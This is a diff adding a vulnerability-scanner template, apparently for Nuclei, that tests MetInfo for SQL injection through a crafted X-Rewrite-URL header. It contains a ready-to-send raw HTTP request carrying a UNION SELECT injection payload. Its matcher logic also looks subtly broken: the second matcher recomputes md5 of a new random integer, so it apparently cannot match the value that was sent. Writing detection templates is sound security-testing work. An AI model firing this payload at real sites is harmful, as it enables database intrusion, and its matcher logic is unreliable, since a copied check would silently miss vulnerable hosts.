@@ -1,0 +1,24 @@
+id: metinfo-sql-injection-cnnvd-201708-306
+info:
+  name: MetInfo SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: low
+  description: |
+    An SQL Injection vulnerability in MetInfo allows attackers to manipulate SQL queries via crafted headers.
+http:
+  - raw:
+      - |
+        GET /index.php?lang=Cn&index=1 HTTP/1.1
+        Host: {{Hostname}}
+        X-Rewrite-URL: 1/2/404xxx' union select md5({{rand_int(40000, 44800)}}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "(?i)location:.*[a-f0-9]{32}"
+      - type: dsl
+        dsl:
+          - contains(header_location, md5(rand_int(40000, 44800)))
